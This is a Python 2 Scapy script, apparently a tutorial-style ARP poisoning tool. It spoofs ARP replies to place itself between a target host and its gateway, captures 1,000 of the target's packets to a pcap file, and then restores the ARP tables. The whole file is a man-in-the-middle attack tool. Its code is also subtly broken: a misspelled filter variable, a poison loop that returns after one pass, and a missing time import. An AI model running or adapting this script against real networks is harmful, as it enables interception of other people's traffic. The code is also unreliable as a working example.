from scapy.all import *
import os
import sys
import threading
import signal

interface = "eth0"
target_ip = "10.0.2.15"
gateway_ip = "10.0.2.2"
packet_count = 1000

""" OUR MAIN FUNCTIONS"""
def get_mac(ip):

    results, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=10)

    # return MAC address from the response
    print results.summary()
    for s,r in results:
        return r[Ether].src

    return None

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):

    # slightly different method using send
    print "[*] Restoring target..."
    
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    # signal the main thread to exit
    os.kill(os.getpid(), signal.SIGINT)

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):

    poison_target = ARP()
    poison_target.op    = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op   = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print "[*] Beginning the ARP poison. [CTRL_C to stop]"

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        print "[*] ARP poison attack finished."
        return
""" END """

# set our interface
conf.iface=interface

# turn off output
conf.verb = 0

print "[*] Setting up %s" % interface

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "[!!] Failed to get gateway MAC. Exiting"
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!] Failed to get target MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip, target_mac)


# start poison thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print "[*] Starting sniffer for %d packets" % packet_count

    bpf_fliter = "ip host %s" % target_ip
    packets = sniff(filter=bpf_filter, count = packet_count, iface=interface, prn=lambda x : x.summary())

    # wite out the captured packets
    wrpcap("arper.pcap", packets)

    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)

    
